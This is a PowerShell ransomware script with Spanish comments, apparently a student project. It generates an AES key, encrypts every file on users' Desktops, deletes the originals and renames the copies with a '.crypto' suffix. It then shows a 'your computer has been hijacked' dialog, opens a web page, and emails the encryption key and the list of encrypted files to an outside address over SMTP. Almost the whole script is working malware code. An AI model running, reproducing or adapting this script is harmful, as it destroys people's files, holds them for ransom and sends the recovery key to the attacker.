
## --------------------------------------------------------------------------##

## CREACION DE LA CLAVE

## --------------------------------------------------------------------------##
function Create-AESKey() {

    ## FUNCION PARA GENERAR LA CLAVE DE ENCRIPTADO QUE SE USARA EN LA SIGUIENTE FUNCION
    ## SE USA EL ESQUEMA DE CIFRADO POR BLOQUES: Advanced Encryption Standard (AES)

    Param(
       [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
       [Int]$KeySize=256
    )

    try
    {
        $AESProvider = New-Object "System.Security.Cryptography.AesManaged"
        $AESProvider.KeySize = $KeySize
        $AESProvider.GenerateKey()
        return [System.Convert]::ToBase64String($AESProvider.Key)
    }
    catch
    {
        Write-Error $_
    }
}

## --------------------------------------------------------------------------##

## CREACION FUNCION ENCRIPACION

## --------------------------------------------------------------------------##
Function Encrypt-File
{

    ## FUNCION PARA ENCRIPTAR LOS ARCHIVOS CON LA CLAVE AES
    ## 


    Param(
       [Parameter(Mandatory=$true, Position=1)]
       [System.IO.FileInfo[]]$FileToEncrypt,
       [Parameter(Mandatory=$true, Position=2)]
       [String]$Key,
       [Parameter(Mandatory=$false, Position=3)]
       [String]$Suffix = '.extension'
    )

    
    Try
    {
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
    }
    Catch
    {
        Write-Error 'Could not load required assembly.'
        Return
    }

    # AQUI SE USA LA CLAVE AES

    try
    {
        $EncryptionKey = [System.Convert]::FromBase64String($Key)
        $KeySize = $EncryptionKey.Length*8
        $AESProvider = New-Object 'System.Security.Cryptography.AesManaged'
        $AESProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESProvider.BlockSize = 128
        $AESProvider.KeySize = $KeySize
        $AESProvider.Key = $EncryptionKey
    }
    Catch
    {
        Write-Error 'Unable to configure AES, verify you are using a valid key.'
        Return
    }

    Write-Verbose "Encryping $($FileToEncrypt.Count) File(s) with the $KeySize-bit key $Key"

    
    $EncryptedFiles = @()
    
    ForEach($File in $FileToEncrypt)
    {
        If($File.Name.EndsWith($Suffix))
        {
            Write-Error "$($File.FullName) already has a suffix of '$Suffix'."
            Continue
        }

        
        Try
        {
            $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
        }
        Catch
        {
            Write-Error "Unable to open $($File.FullName) for reading."
            Continue
        }

        
        $DestinationFile = $File.FullName + $Suffix
        Try
        {
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
        }
        Catch
        {
            Write-Error "Unable to open $DestinationFile for writing."
            $FileStreamReader.Close()
            Continue
        }
    
        
        $AESProvider.GenerateIV()
        $FileStreamWriter.Write([System.BitConverter]::GetBytes($AESProvider.IV.Length), 0, 4)
        $FileStreamWriter.Write($AESProvider.IV, 0, $AESProvider.IV.Length)

        Write-Verbose "Encrypting $($File.FullName) with an IV of $([System.Convert]::ToBase64String($AESProvider.IV))"

        # ENCRIPTACION DE LOS ARCHIVOS

        try
        {
            $Transform = $AESProvider.CreateEncryptor()
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            [Int]$Count = 0
            [Int]$BlockSizeBytes = $AESProvider.BlockSize / 8
            [Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
            Do
            {
                $Count = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
                $CryptoStream.Write($Data, 0, $Count)
            }
            While($Count -gt 0)
    
            
            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamReader.Close()
            $FileStreamWriter.Close()

            
            Remove-Item $File.FullName
            Write-Verbose "Successfully encrypted $($File.FullName)"
            $EncryptedFiles += $DestinationFile
        }
        catch
        {
            Write-Error "Failed to encrypt $($File.FullName)."
            $CryptoStream.Close()
            $FileStreamWriter.Close()
            $FileStreamReader.Close()
            Remove-Item $DestinationFile
        }
    }

    $Result = New-Object –TypeName PSObject
    $Result | Add-Member –MemberType NoteProperty –Name Computer –Value $env:COMPUTERNAME
    $Result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
    $Result | Add-Member –MemberType NoteProperty –Name Files –Value $EncryptedFiles
    return $Result
}


## --------------------------------------------------------------------------##

## ALMACENAMOS LA FUNCION DE CRACION DE CLAVE EN UNA VARIABLE

$key = Create-AESKey 
 

## ENCRIPTAMOS LOS ARCHIVOS CON LA EXTENSION .crypto

foreach($_ in Get-ChildItem C:\*\*\Desktop\* -ErrorAction SilentlyContinue)
{Encrypt-File $_ -Key $key -Suffix '.crypto' -ErrorAction SilentlyContinue} 



## --------------------------------------------------------------------------##

## MENSAJE DE ERROR

## --------------------------------------------------------------------------##
 

Function Mostrar-MensajeCuadroDialogo {


Param
(
[string]$Mensaje, 
[string]$Titulo, 
[System.Windows.Forms.MessageBoxButtons]$Botones, 
[System.Windows.Forms.MessageBoxIcon]$Icono

)

    return [System.Windows.Forms.MessageBox]::Show($Mensaje, $Titulo, $Botones, $Icono)
}

Mostrar-MensajeCuadroDialogo -Mensaje (
 
       "¡ Su Ordenador a sido secuestrado !"

) -Titulo "¡¡¡ ATENCION !!!" -Botones OK -Icono Error



## --------------------------------------------------------------------------##

## ABRIR NAVEGADOR

## --------------------------------------------------------------------------##
 


$IE=new-object -com internetexplorer.application
$IE.navigate2("http://asir2proyectoransomware.esy.es/")
$IE.visible=$true

## --------------------------------------------------------------------------##

## MANDAR MENSAJE

## LA IDEA DEL CORREO ES GENERAR UN INFORME CON LA CLAVE USADA Y LOS ARCHIVOS
## QUE SE HAN CIFRADO.
## PODEMOS MANDARNOS UN MENSAJE A NOSOTROS MISMOS Y ASI NO USAR EL CORREO DE LA VICTIMA
## SE HARIA PONIENDO EL CORREO EN $Username Y LA CONTRASEÑA EN $Password

## --------------------------------------------------------------------------##
 

$Files = gci -Name
$Number = (gci).count 
$InfoKey = '
La clave de encriptacion es: ' + $key + '
'
$InfoDone= '
El numero de ficheros es ' + $Number + ' con los nombres: 
' 
$Body = $InfoKey + $InfoDone +  ($Files | Format-List | Out-String ) 
$Body


$Username = "EMAIL QUE SE USA PARA ENVIAREL INFORME"
$Password = ConvertTo-SecureString -String "CONTRASEÑA DEL EMAIL" -AsPlainText -Force
$Credentials = New-Object System.Management.Automation.PSCredential($Username,$Password)
Send-MailMessage -To “EMAIL"  -From "EMAIL" -SmtpServer 'smtp.live.com' -UseSsl -Subject “RANSOMWARE” -Body “$Body” -Credential $Credentials




## --------------------------------------------------------------------------##

